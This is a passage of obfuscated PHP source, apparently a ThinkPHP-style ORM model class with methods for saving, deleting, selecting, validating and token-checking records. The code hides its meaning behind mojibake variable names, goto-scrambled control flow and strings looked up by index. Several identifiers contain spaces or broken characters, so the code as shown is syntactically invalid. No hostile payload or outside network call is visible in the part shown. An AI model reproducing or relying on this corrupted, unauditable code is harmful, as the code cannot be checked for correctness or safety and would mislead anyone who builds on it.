(empty($F’Çë¤æïŒ)) { $this->error = think_lang($C¢Â©ñÊé[274]); return !1; } $dŠÉó“¯ìÆ = $this->_parseOptions($dŠÉó“¯ìÆ); goto b²ôÃ¬í“ƒ; A‹ç‰¡Ûƒ: } public function selectAdd($e¸£¶Ã•É = '', $CóŒˆºÅœ¦ = '', $EØö÷ÇÕ = array()) { $A±©„’·×É =& $_SERVER[±á õÁ]; $EØö÷ÇÕ = $this->_parseOptions($EØö÷ÇÕ); if (!1 === ($c’²•çæº¶ = $this->db->selectInsert($e¸£¶Ã•É ? $e¸£¶Ã•É : $EØö÷ÇÕ[$A±©„’·×É[276]], $CóŒˆºÅœ¦ ? $CóŒˆºÅœ¦ : $this->getTableName(), $EØö÷ÇÕ))) { $this->error = think_lang($A±©„’·×É[277]); return !1; } else { return $c’²•çæº¶; } } public function save($A‚è‡Í’¾¼ = '', $fŸ±®£çµÛ = array()) { goto c‘§Š’ÊÇ¡; d¦¸¬“”: if (!1 !== $dÅ¥äöÄ­Æ) { if (isset($C‹¦ÃàÃØê)) { $A‚è‡Í’¾¼[$A®ª§Œãèô] = $C‹¦ÃàÃØê; } $this->_afterUpdate($A‚è‡Í’¾¼, $fŸ±®£çµÛ); } return $dÅ¥äöÄ­Æ; goto e™”Ù©†è; fµŒ–‚å¬: $fŸ±®£çµÛ = $this->_parseOptions($fŸ±®£çµÛ); $A®ª§Œãèô = $this->getPk(); if (!isset($fŸ±®£çµÛ[$f¡©ï”ÑÒ®[278]])) { if (isset($A‚è‡Í’¾¼[$A®ª§Œãèô])) { $bÕğ„ÉÄ­[$A®ª§Œãèô] = $A‚è‡Í’¾¼[$A®ª§Œãèô]; $fŸ±®£çµÛ[$f¡©ï”ÑÒ®[278]] = $bÕğ„ÉÄ­; unset($A‚è‡Í’¾¼[$A®ª§Œãèô]); } else { $this->error = think_lang($f¡©ï”ÑÒ®[277]); return !1; } } goto B÷×ÅÌ°¯È; c‘§Š’ÊÇ¡: $f¡©ï”ÑÒ® =& $_SERVER[±á õÁ]; if (empty($A‚è‡Í’¾¼)) { if (!empty($this->data)) { $A‚è‡Í’¾¼ = $this->data; $this->data = array(); } else { $this->error = think_lang($f¡©ï”ÑÒ®[274]); return !1; } } $A‚è‡Í’¾¼ = $this->_facade($A‚è‡Í’¾¼); goto fµŒ–‚å¬; B÷×ÅÌ°¯È: if (is_array($fŸ±®£çµÛ[$f¡©ï”ÑÒ®[278]]) && isset($fŸ±®£çµÛ[$f¡©ï”ÑÒ®[278]][$A®ª§Œãèô])) { $C‹¦ÃàÃØê = $fŸ±®£çµÛ[$f¡©ï”ÑÒ®[278]][$A®ª§Œãèô]; } if (!1 === $this->_beforeUpdate($A‚è‡Í’¾¼, $fŸ±®£çµÛ)) { return !1; } $dÅ¥äöÄ­Æ = $this->db->update($A‚è‡Í’¾¼, $fŸ±®£çµÛ); goto d¦¸¬“”; e™”Ù©†è: } protected function _beforeUpdate(&$EÆ—¶¤‘Ş, $f¤‚ªÉƒ´°) { } protected function _afterUpdate($C„»Ï¬, $a±Ê¸Œ·®œ) { } public function delete($AÀŠ¨¹øÛ‚ = array()) { goto fÃìÙ±à§; fÃìÙ±à§: $D¤Šªª÷î =& $_SERVER[±á õÁ]; if (empty($AÀŠ¨¹øÛ‚) && empty($this->options[$D¤Šªª÷î[278]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $DÏŸ¦çÏì = $this->getPk(); goto E×›´‚Ê•Å; E×›´‚Ê•Å: if (is_numeric($AÀŠ¨¹øÛ‚) || is_string($AÀŠ¨¹øÛ‚)) { if (strpos($AÀŠ¨¹øÛ‚, $D¤Šªª÷î[57])) { $cî±…õÓ¶“[$DÏŸ¦çÏì] = array($D¤Šªª÷î[279], $AÀŠ¨¹øÛ‚); } else { $cî±…õÓ¶“[$DÏŸ¦çÏì] = $AÀŠ¨¹øÛ‚; } $this->options[$D¤Šªª÷î[278]] = $cî±…õÓ¶“; } $AÀŠ¨¹øÛ‚ = $this->_parseOptions(); if (is_array($AÀŠ¨¹øÛ‚[$D¤Šªª÷î[278]]) && isset($AÀŠ¨¹øÛ‚[$D¤Šªª÷î[278]][$DÏŸ¦çÏì])) { $B›ÂÍÉÓË = $AÀŠ¨¹øÛ‚[$D¤Šªª÷î[278]][$DÏŸ¦çÏì]; } goto C©×ì—ÜÖÑ; C©×ì—ÜÖÑ: $eéç© Ü  = $this->db->delete($AÀŠ¨¹øÛ‚); if (!1 !== $eéç© Ü ) { $aÀ®›¯’ = array(); if (isset($B›ÂÍÉÓË)) { $aÀ®›¯’[$DÏŸ¦çÏì] = $B›ÂÍÉÓË; } $this->_after_delete($aÀ®›¯’, $AÀŠ¨¹øÛ‚); } return $eéç© Ü ; goto d„­ÒìòŠ; d„­ÒìòŠ: } protected function _after_delete($fŠÜ×ÒËšÙ, $e±Ÿ·‘­½Î) { } public function select($DÀË’Àøä§ = array()) { goto eõñÙŠ”¥; D¨‚¯ïªî: $this->_afterSelect($A·Ê„½µÄ, $DÀË’Àøä§); return $A·Ê„½µÄ; goto CÇ¡ª•Á‡«; eõñÙŠ”¥: $C£éÃêÌÌ =& $_SERVER[±á õÁ]; if (is_string($DÀË’Àøä§) || is_numeric($DÀË’Àøä§)) { $CªĞËôšŒš = $this->getPk(); if (strpos($DÀË’Àøä§, $C£éÃêÌÌ[57])) { $B­ÜãÄ•Ô[$CªĞËôšŒš] = array($C£éÃêÌÌ[279], $DÀË’Àøä§); } else { $B­ÜãÄ•Ô[$CªĞËôšŒš] = $DÀË’Àøä§; } $this->options[$C£éÃêÌÌ[278]] = $B­ÜãÄ•Ô; } elseif (!1 === $DÀË’Àøä§) { $DÀË’Àøä§ = $this->_parseOptions(); return $C£éÃêÌÌ[280] . $this->db->buildSelectSql($DÀË’Àøä§) . $C£éÃêÌÌ[281]; } $DÀË’Àøä§ = $this->_parseOptions(); goto fÊ•´ê÷Ï; fÊ•´ê÷Ï: $A·Ê„½µÄ = $this->db->select($DÀË’Àøä§); if (!1 === $A·Ê„½µÄ) { return !1; } if (empty($A·Ê„½µÄ)) { return null; } goto D¨‚¯ïªî; CÇ¡ª•Á‡«: } protected function _afterSelect(&$bïíí×«Î, $BÖİ‹ì‘§‹) { } public function buildSql($BÒ×‘ÌÓÇë = array()) { $c¹¥‘¾œô =& $_SERVER[±á õÁ]; $BÒ×‘ÌÓÇë = $this->_parseOptions($BÒ×‘ÌÓÇë); return $c¹¥‘¾œô[280] . $this->db->buildSelectSql($BÒ×‘ÌÓÇë) . $c¹¥‘¾œô[281]; } public function optionsValue($a«øÍ†ë± = null) { if (is_null($a«øÍ†ë±)) { return $this->options; } elseif (is_array($a«øÍ†ë±)) { $this->options = array_merge($this->options, $a«øÍ†ë±); } } protected function _parseOptions($B²ïéƒÔÁ = array()) { goto fëÜºà„Áã; bÈóÆôÍš : if (isset($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[278]]) && is_array($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[278]]) && !empty($DÃ¼ğÍ»©è) && !isset($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[285]]) && !isset($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[282]])) { foreach ($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[278]] as $DÎí²À¡´ => $D¡ŠŒéš¸×) { $DÎí²À¡´ = trim($DÎí²À¡´); if (in_array($DÎí²À¡´, $DÃ¼ğÍ»©è, !0)) { if (is_scalar($D¡ŠŒéš¸×)) { $this->_parseType($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[278]], $DÎí²À¡´); } } elseif (!is_numeric($DÎí²À¡´) && $CÎÈ‹ˆ¸ŒÅ[80] != substr($DÎí²À¡´, 0, 1) && !1 === strpos($DÎí²À¡´, $CÎÈ‹ˆ¸ŒÅ[101]) && !1 === strpos($DÎí²À¡´, $CÎÈ‹ˆ¸ŒÅ[263]) && !1 === strpos($DÎí²À¡´, $CÎÈ‹ˆ¸ŒÅ[286]) && !1 === strpos($DÎí²À¡´, $CÎÈ‹ˆ¸ŒÅ[287])) { unset($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[278]][$DÎí²À¡´]); } } } $this->_options_filter($B²ïéƒÔÁ); return $B²ïéƒÔÁ; goto aº…Œ‚ŠØç; EõÃ­ŒÔ¡³: if (!isset($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[282]])) { $B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[282]] = $this->getTableName(); $DÃ¼ğÍ»©è = $this->fields; } else { $DÃ¼ğÍ»©è = $this->getDbFields(); } if (!empty($B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[283]])) { $B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[282]] .= $CÎÈ‹ˆ¸ŒÅ[60] . $B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[283]]; } $B²ïéƒÔÁ[$CÎÈ‹ˆ¸ŒÅ[284]] = $this->name; goto bÈóÆôÍš ; fëÜºà„Áã: $CÎÈ‹ˆ¸ŒÅ =& $_SERVER[±á õÁ]; if (is_array($B²ïéƒÔÁ)) { $B²ïéƒÔÁ = array_merge($this->options, $B²ïéƒÔÁ); } $this->options = array(); goto EõÃ­ŒÔ¡³; aº…Œ‚ŠØç: } protected function _options_filter(&$bÛÄ…Û’Ñ÷) { } protected function _parseType(&$b¯Ü™—¡İÍ, $E©¨«ŒÔŒ) { $Aæ˜¹´¬í =& $_SERVER[±á õÁ]; if (empty($this->options[$Aæ˜¹´¬í[288]][$Aæ˜¹´¬í[4] . $E©¨«ŒÔŒ])) { $Eõ’¨èÅòÊ = strtolower($this->fields[$Aæ˜¹´¬í[255]][$E©¨«ŒÔŒ]); if (!1 !== strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[289])) { } elseif (!1 === strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[290]) && !1 !== strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[291])) { $b¯Ü™—¡İÍ[$E©¨«ŒÔŒ] = intval($b¯Ü™—¡İÍ[$E©¨«ŒÔŒ]); } elseif (!1 !== strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[292]) || !1 !== strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[293])) { $b¯Ü™—¡İÍ[$E©¨«ŒÔŒ] = floatval($b¯Ü™—¡İÍ[$E©¨«ŒÔŒ]); } elseif (!1 !== strpos($Eõ’¨èÅòÊ, $Aæ˜¹´¬í[294])) { $b¯Ü™—¡İÍ[$E©¨«ŒÔŒ] = (bool) $b¯Ü™—¡İÍ[$E©¨«ŒÔŒ]; } } } public function find($aŒÃ­¾ê—¤ = array()) { goto d…”Œ²‹†¬; d…”Œ²‹†¬: $aõâÕ¯«Õò =& $_SERVER[±á õÁ]; if (is_numeric($aŒÃ­¾ê—¤) || is_string($aŒÃ­¾ê—¤)) { $C„£Œö¿‘[$this->getPk()] = intval($aŒÃ­¾ê—¤); $this->options[$aõâÕ¯«Õò[278]] = $C„£Œö¿‘; } $this->options[$aõâÕ¯«Õò[295]] = 1; goto BÀÆ¢óí; AŠÔƒ´¥Æ: if (empty($b†‰¿ÕÒÕ)) { return null; } $this->data = $b†‰¿ÕÒÕ[0]; $this->_afterFind($this->data, $aŒÃ­¾ê—¤); goto cìÀŠİ”àŠ; cìÀŠİ”àŠ: if (!empty($this->options[$aõâÕ¯«Õò[296]])) { return $this->returnResult($this->data, $this->options[$aõâÕ¯«Õò[296]]); } return $this->data; goto CŞ…ïº„ğÖ; BÀÆ¢óí: $aŒÃ­¾ê—¤ = $this->_parseOptions(); $b†‰¿ÕÒÕ = $this->db->select($aŒÃ­¾ê—¤); if (!1 === $b†‰¿ÕÒÕ) { return !1; } goto AŠÔƒ´¥Æ; CŞ…ïº„ğÖ: } protected function _afterFind(&$a“Ôäªİæ, $eØÑ¶õÇ†á) { } protected function returnResult($A¶ å‰“ÃÀ, $bè»àŸ£ìè = '') { $bÒ…½ŒÜÑ˜ =& $_SERVER[±á õÁ]; if ($bè»àŸ£ìè) { if (is_callable($bè»àŸ£ìè)) { return call_user_func($bè»àŸ£ìè, $A¶ å‰“ÃÀ); } switch (strtolower($bè»àŸ£ìè)) { case $bÒ…½ŒÜÑ˜[297]: return json_encode($A¶ å‰“ÃÀ); case $bÒ…½ŒÜÑ˜[298]: return xml_encode($A¶ å‰“ÃÀ); } } return $A¶ å‰“ÃÀ; } public function parseFieldsMap($F›®‰æ«æĞ, $c¯×¦…‘ƒ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $A¤‡›ó×¶Ø => $dæ¸óè§ù—) { if ($c¯×¦…‘ƒ == 1) { if (isset($F›®‰æ«æĞ[$dæ¸óè§ù—])) { $F›®‰æ«æĞ[$A¤‡›ó×¶Ø] = $F›®‰æ«æĞ[$dæ¸óè§ù—]; unset($F›®‰æ«æĞ[$dæ¸óè§ù—]); } } else { if (isset($F›®‰æ«æĞ[$A¤‡›ó×¶Ø])) { $F›®‰æ«æĞ[$dæ¸óè§ù—] = $F›®‰æ«æĞ[$A¤‡›ó×¶Ø]; unset($F›®‰æ«æĞ[$A¤‡›ó×¶Ø]); } } } } return $F›®‰æ«æĞ; } public function setField($fùœÊËó¨, $f¨Ì©¼‰‡‰ = '') { if (is_array($fùœÊËó¨)) { $dì±â»Éˆõ = $fùœÊËó¨; } else { $dì±â»Éˆõ[$fùœÊËó¨] = $f¨Ì©¼‰‡‰; } return $this->save($dì±â»Éˆõ); } public function setAdd($F‹Ùß‘óïö, $b«ãâ˜í‡ = 1) { $EËóÈœİ =& $_SERVER[±á õÁ]; $DÈ«æ…¼ï = $F‹Ùß‘óïö . $EËóÈœİ[299] . $b«ãâ˜í‡; if ($b«ãâ˜í‡ < 0) { $DÈ«æ…¼ï = $F‹Ùß‘óïö . $b«ãâ˜í‡; } return $this->setField($F‹Ùß‘óïö, array($EËóÈœİ[300], $DÈ«æ…¼ï)); } public function getField($c³¶Ä·×¦, $a¢ÚĞĞ“À = null) { $Ešİò¬çæñ =& $_SERVER[±á õÁ]; $E¶ÎÕÎ[$Ešİò¬çæñ[276]] = $c³¶Ä·×¦; $E¶ÎÕÎ = $this->_parseOptions($E¶ÎÕÎ); $c³¶Ä·×¦ = trim($c³¶Ä·×¦); if (strpos($c³¶Ä·×¦, $Ešİò¬çæñ[57])) { if (!isset($E¶ÎÕÎ[$Ešİò¬çæñ[295]])) { $E¶ÎÕÎ[$Ešİò¬çæñ[295]] = is_numeric($a¢ÚĞĞ“À) ? $a¢ÚĞĞ“À : $Ešİò¬çæñ[43]; } $C¥„ÚØ‰°¡ = $this->db->select($E¶ÎÕÎ); if (!empty($C¥„ÚØ‰°¡)) { goto d§…Ş”§†; cŸÛ—ÕÃ“İ: $CôÖƒˆ„Ğ› = array_shift($c³¶Ä·×¦); $DùÑôæÜºç = array(); $CÌÄìÇ˜ ‡ = count($cÀ½¶˜¯‘); goto Cµá´Ì»œù; Cµá´Ì»œù: foreach ($C¥„ÚØ‰°¡ as $a¾¯Š®ñÀÀ) { $EÓŒ‹×•ä‡ = $a¾¯Š®ñÀÀ[$aÖ·™Ê ‡†]; if (2 == $CÌÄìÇ˜ ‡) { $DùÑôæÜºç[$EÓŒ‹×•ä‡] = $a¾¯Š®ñÀÀ[$CôÖƒˆ„Ğ›]; } else { $DùÑôæÜºç[$EÓŒ‹×•ä‡] = is_string($a¢ÚĞĞ“À) ? implode($a¢ÚĞĞ“À, $a¾¯Š®ñÀÀ) : $a¾¯Š®ñÀÀ; } } return $DùÑôæÜºç; goto BÍÇØá‹äÅ; d§…Ş”§†: $cÀ½¶˜¯‘ = explode($Ešİò¬çæñ[57], $c³¶Ä·×¦); $c³¶Ä·×¦ = array_keys($C¥„ÚØ‰°¡[0]); $aÖ·™Ê ‡† = array_shift($c³¶Ä·×¦); goto cŸÛ—ÕÃ“İ; BÍÇØá‹äÅ: } } else { if (!0 !== $a¢ÚĞĞ“À) { $E¶ÎÕÎ[$Ešİò¬çæñ[295]] = is_numeric($a¢ÚĞĞ“À) ? $a¢ÚĞĞ“À : 1; } if ($a¢ÚĞĞ“À === $Ešİò¬çæñ[258]) { unset($E¶ÎÕÎ[$Ešİò¬çæñ[295]]); } $a¾¯Š®ñÀÀ = $this->db->select($E¶ÎÕÎ); if (!empty($a¾¯Š®ñÀÀ)) { if ($a¢ÚĞĞ“À === $Ešİò¬çæñ[258]) { return reset($a¾¯Š®ñÀÀ[0]); } if (!0 !== $a¢ÚĞĞ“À && 1 == $E¶ÎÕÎ[$Ešİò¬çæñ[295]]) { return reset($a¾¯Š®ñÀÀ[0]); } foreach ($a¾¯Š®ñÀÀ as $bÀØñá˜è) { $F«¾¥ÆÒê[] = $bÀØñá˜è[$c³¶Ä·×¦]; } return $F«¾¥ÆÒê; } } return null; } public function create($F¶‰™è“Ò = '', $B…Ë´¡Ü = '') { goto f«ôé°¿¡ğ; f«ôé°¿¡ğ: $B­Á’ëËÇŒ =& $_SERVER[±á õÁ]; if (empty($F¶‰™è“Ò)) { $F¶‰™è“Ò = $_POST; } elseif (is_object($F¶‰™è“Ò)) { $F¶‰™è“Ò = get_object_vars($F¶‰™è“Ò); } if (empty($F¶‰™è“Ò) || !is_array($F¶‰™è“Ò)) { $this->error = think_lang($B­Á’ëËÇŒ[274]); return !1; } goto C¯¶˜Á¢»Ä; Eéºâå‚ö: if (isset($DØã¾—¥²)) { if (is_string($DØã¾—¥²)) { $DØã¾—¥² = explode($B­Á’ëËÇŒ[57], $DØã¾—¥²); } if (think_config($B­Á’ëËÇŒ[301])) { $DØã¾—¥²[] = think_config($B­Á’ëËÇŒ[302]); } foreach ($F¶‰™è“Ò as $fè«ãåâÉï => $a¯’ç¼é¦Ñ) { if (!in_array($fè«ãåâÉï, $DØã¾—¥²)) { unset($F¶‰™è“Ò[$fè«ãåâÉï]); } } } if (!$this->autoValidation($F¶‰™è“Ò, $B…Ë´¡Ü)) { return !1; } if (!$this->autoCheckToken($F¶‰™è“Ò)) { $this->error = think_lang($B­Á’ëËÇŒ[303]); return !1; } goto dÑÁİ¼•‹ï; dÑÁİ¼•‹ï: if ($this->autoCheckFields) { $DØã¾—¥² = $this->getDbFields(); foreach ($F¶‰™è“Ò as $fè«ãåâÉï => $a¯’ç¼é¦Ñ) { if (!in_array($fè«ãåâÉï, $DØã¾—¥²)) { unset($F¶‰™è“Ò[$fè«ãåâÉï]); } elseif (MAGIC_QUOTES_GPC && is_string($a¯’ç¼é¦Ñ)) { $F¶‰™è“Ò[$fè«ãåâÉï] = stripslashes($a¯’ç¼é¦Ñ); } } } $this->autoOperation($F¶‰™è“Ò, $B…Ë´¡Ü); $this->data = $F¶‰™è“Ò; goto Aº›ä‹œƒ¦; C¯¶˜Á¢»Ä: $F¶‰™è“Ò = $this->parseFieldsMap($F¶‰™è“Ò, 0); $B…Ë´¡Ü = $B…Ë´¡Ü ? $B…Ë´¡Ü : (!empty($F¶‰™è“Ò[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$B­Á’ëËÇŒ[276]])) { $DØã¾—¥² = $this->options[$B­Á’ëËÇŒ[276]]; unset($this->options[$B­Á’ëËÇŒ[276]]); } elseif ($B…Ë´¡Ü == THINK_MODEL_INSERT && isset($this->insertFields)) { $DØã¾—¥² = $this->insertFields; } elseif ($B…Ë´¡Ü == THINK_MODEL_UPDATE && isset($this->updateFields)) { $DØã¾—¥² = $this->updateFields; } goto Eéºâå‚ö; Aº›ä‹œƒ¦: return $F¶‰™è“Ò; goto aªŸ‡¤öà; aªŸ‡¤öà: } public function autoCheckToken($a²ŠÙ‘¦É) { $Cã‹˜²¿ê¥ =& $_SERVER[±á õÁ]; if (isset($this->options[$Cã‹˜²¿ê¥[304]]) && !$this->options[$Cã‹˜²¿ê¥[304]]) { return !0; } if (think_config($Cã‹˜²¿ê¥[301])) { $AóêÏí´Œø = think_config($Cã‹˜²¿ê¥[302]); if (!isset($a²ŠÙ‘¦É[$AóêÏí´Œø]) || Session::get($AóêÏí´Œø)) { return !1; } list($DŞËô¬„ÔØ, $BøÙ½—‚) = explode($Cã‹˜²¿ê¥[80], $a²ŠÙ‘¦É[$AóêÏí´Œø]); if ($BøÙ½—‚ && Session::get($AóêÏí´Œø . $Cã‹˜²¿ê¥[101] . $DŞËô¬„ÔØ) === $BøÙ½—‚) { Session::remove($AóêÏí´Œø . $Cã‹˜²¿ê¥[101] . $DŞËô¬„ÔØ); return !0; } if (think_config($Cã‹˜²¿ê¥[305])) { Session::remove($AóêÏí´Œø . $Cã‹˜²¿ê¥[101] . $DŞËô¬„ÔØ); } return !1; } return !0; } public function regex($dí„ÒÀº×, $E»¦ÇˆØõç) { $e¿¿ìëó©ë =& $_SERVER[±á õÁ]; $BÕß£ªçÑ = array($e¿¿ìëó©ë[306] => $e¿¿ìëó©ë[307], $e¿¿ìëó©ë[308] => $e¿¿ìëó©ë[309], $e¿¿ìëó©ë[310] => $e¿¿ìëó©ë[311], $e¿¿ìëó©ë[312] => $e¿¿ìëó©ë[313], $e¿¿ìëó©ë[314] => $e¿¿ìëó©ë[315], $e¿¿ìëó©ë[316] => $e¿¿ìëó©ë[317], $e¿¿ìëó©ë[318] => $e¿¿ìëó©ë[319], $e¿¿ìëó©ë[293] => $e¿¿ìëó©ë[320], $e¿¿ìëó©ë[321] => $e¿¿ìëó©ë[322]); if (isset($BÕß£ªçÑ[strtolower($E»¦ÇˆØõç)])) { $E»¦ÇˆØõç = $BÕß£ªçÑ[strtolower($E»¦ÇˆØõç)]; } return preg_match($E»¦ÇˆØõç, $dí„ÒÀº×) === 1; } private function autoOperation(&$C©‚‹ä»ÁÑ, $b¤ã–ÏôÂ©) { $bË‚©ˆî  =& $_SERVER[±á õÁ]; if (!empty($this->options[$bË‚©ˆî [323]])) { $EôâÉ±öŞÎ = $this->options[$bË‚©ˆî [323]]; unset($this->options[$bË‚©ˆî [323]]); } elseif (!empty($this->_auto)) { $EôâÉ±öŞÎ = $this->_auto; } if (isset($EôâÉ±öŞÎ)) { foreach ($EôâÉ±öŞÎ as $fÄŞ‘áÜÎØ) { if (empty($fÄŞ‘áÜÎØ[2])) { $fÄŞ‘áÜÎØ[2] = THINK_MODEL_INSERT; } if ($b¤ã–ÏôÂ© == $fÄŞ‘áÜÎØ[2] || $fÄŞ‘áÜÎØ[2] == THINK_MODEL_BOTH) { switch (trim($fÄŞ‘áÜÎØ[3])) { case $bË‚©ˆî [324]: case $bË‚©ˆî [325]: $cĞ¡ïá‡ = isset($fÄŞ‘áÜÎØ[4]) ? (array) $fÄŞ‘áÜÎØ[4] : array(); if (isset($C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]])) { array_unshift($cĞ¡ïá‡, $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]]); } if ($bË‚©ˆî [324] == $fÄŞ‘áÜÎØ[3]) { $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]] = call_user_func_array($fÄŞ‘áÜÎØ[1], $cĞ¡ïá‡); } else { $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]] = call_user_func_array(array(&$this, $fÄŞ‘áÜÎØ[1]), $cĞ¡ïá‡); } break; case $bË‚©ˆî [276]: $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]] = $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[1]]; break; case $bË‚©ˆî [326]: if ($bË‚©ˆî [43] === $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]]) { unset($C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]]); } break; case $bË‚©ˆî [327]: default: $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]] = $fÄŞ‘áÜÎØ[1]; } if (!1 === $C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]]) { unset($C©‚‹ä»ÁÑ[$fÄŞ‘áÜÎØ[0]]); } } } } return $C©‚‹ä»ÁÑ; } protected function autoValidation($AŸÏÖ“±ÆŸ, $D‘ÒÕÜİƒ) { $C¥Å‰ï•èÎ =& $_SERVER[±á õÁ]; if (!empty($this->options[$C¥Å‰ï•èÎ[328]])) { $dñ†˜öÊµ = $this->options[$C¥Å‰ï•èÎ[328]]; unset($this->options[$C¥Å‰ï•èÎ[328]]); } elseif (!empty($this->_validate)) { $dñ†˜öÊµ = $this->_validate; } if (isset($dñ†˜öÊµ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($dñ†˜öÊµ as $BÏŠÓó¥‰ => $Bª˜å—†§) { if (empty($Bª˜å—†§[5]) || $Bª˜å—†§[5] == THINK_MODEL_BOTH || $Bª˜å—†§[5] == $D‘ÒÕÜİƒ) { if (0 == strpos($Bª˜å—†§[2], $C¥Å‰ï•èÎ[329]) && strpos($Bª˜å—†§[2], $C¥Å‰ï•èÎ[330])) { $Bª˜å—†§[2] = think_lang(substr($Bª˜å—†§[2], 2, -1)); } $Bª˜å—†§[3] = isset($Bª˜å—†§[3]) ? $Bª˜å—†§[3] : THINK_EXISTS_VALIDATE; $Bª˜å—†§[4] = isset($Bª˜å—†§[4]) ? $Bª˜å—†§[4] : $C¥Å‰ï•èÎ[331]; switch ($Bª˜å—†§[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($AŸÏÖ“±ÆŸ, $Bª˜å—†§)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($C¥Å‰ï•èÎ[43] != trim($AŸÏÖ“±ÆŸ[$Bª˜å—†§[0]])) { if (!1 === $this->_validationField($AŸÏÖ“±ÆŸ, $Bª˜å—†§)) { return !1; } } break; default: if (isset($AŸÏÖ“±ÆŸ[$Bª˜å—†§[0]])) { if (!1 === $this->_validationField($AŸÏÖ“±ÆŸ, $Bª˜å—†§)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($BÆÓÕ‹À¦, $bÛõ‹ÎØ„¾) { if (!1 === $this->_validationFieldItem($BÆÓÕ‹À¦, $bÛõ‹ÎØ„¾)) { if ($this->patchValidate) { $this->error[$bÛõ‹ÎØ„¾[0]] = $bÛõ‹ÎØ„¾[2]; } else { $this->error = $bÛõ‹ÎØ„¾[2]; return !1; } } return; } protected function _validationFieldItem($F•¦×™†, $eË¤ƒ±ˆ‰) { $a×ËÉÕµÃ‹ =& $_SERVER[±á õÁ]; switch (strtolower(trim($eË¤ƒ±ˆ‰[4]))) { case $a×ËÉÕµÃ‹[324]: case $a×ËÉÕµÃ‹[325]: $b†ôî‹Ææ = isset($eË¤ƒ±ˆ‰[6]) ? (array) $eË¤ƒ±ˆ‰[6] : array(); if (is_string($eË¤ƒ±ˆ‰[0]) && strpos($eË¤ƒ±ˆ‰[0], $a×ËÉÕµÃ‹[57])) { $eË¤ƒ±ˆ‰[0] = explode($a×ËÉÕµÃ‹[57], $eË¤ƒ±ˆ‰[0]); } if (is_array($eË¤ƒ±ˆ‰[0])) { foreach ($eË¤ƒ±ˆ‰[0] as $Dè±´ÜÇ×¼) { $f®ƒ¾ìõ[$Dè±´ÜÇ×¼] = $F•¦×™†[$Dè±´ÜÇ×¼]; } array_unshift($b†ôî‹Ææ, $f®ƒ¾ìõ); } else { array_unshift($b†ôî‹Ææ, $F•¦×™†[$eË¤ƒ±ˆ‰[0]]); } if ($a×ËÉÕµÃ‹[324] == $eË¤ƒ±ˆ‰[4]) { return call_user_func_array($eË¤ƒ±ˆ‰[1], $b†ôî‹Ææ); } else { return call_user_func_array(array(&$this, $eË¤ƒ±ˆ‰[1]), $b†ôî‹Ææ); } case $a×ËÉÕµÃ‹[332]: return $F•¦×™†[$eË¤ƒ±ˆ‰[0]] == $F•¦×™†[$eË¤ƒ±ˆ‰[1]]; case $a×ËÉÕµÃ‹[333]: if (is_string($eË¤ƒ±ˆ‰[0]) && strpos($eË¤ƒ±ˆ‰[0], $a×ËÉÕµÃ‹[57])) { $eË¤ƒ±ˆ‰[0] = explode($a×ËÉÕµÃ‹[57], $eË¤ƒ±ˆ‰[0]); } $EÄ½ß‹µçª = array(); if (is_array($eË¤ƒ±ˆ‰[0])) { foreach ($eË¤ƒ±ˆ‰[0] as $Dè±´ÜÇ×¼) { $EÄ½ß‹µçª[$Dè±´ÜÇ×¼] = $F•¦×™†[$Dè±´ÜÇ×¼]; } } else { $EÄ½ß‹µçª[$eË¤ƒ±ˆ‰[0]] = $F•¦×™†[$eË¤ƒ±ˆ‰[0]]; } if (!empty($F•¦×™†[$this->getPk()])) { $EÄ½ß‹µçª[$this->getPk()] = array($a×ËÉÕµÃ‹[334], $F•¦×™†[$this->getPk()]); } if ($this->where($EÄ½ß‹µçª)->find()) { return !1; } return !0; default: return $this->check($F•¦×™†[$eË¤ƒ±ˆ‰[0]], $eË¤ƒ±ˆ‰[1], $eË¤ƒ±ˆ‰[4]); } } public function check($f”Ñ²Õ©°ç, $c®‰¨ƒ¦Â, $AÎ¿¡‹ßºÌ = "\x72\x65\x67\x65\170") { $C µ±¦ŞÊœ =& $_SERVER[±á õÁ]; $AÎ¿¡‹ßºÌ = strtolower(trim($AÎ¿¡‹ßºÌ)); switch ($AÎ¿¡‹ßºÌ) { case $C µ±¦ŞÊœ[7]: case $C µ±¦ŞÊœ[335]: $cÍÅ¿—õš” = is_array($c®‰¨ƒ¦Â) ? $c®‰¨ƒ¦Â : explode($C µ±¦ŞÊœ[57], $c®‰¨ƒ¦Â); return $AÎ¿¡‹ßºÌ == $C 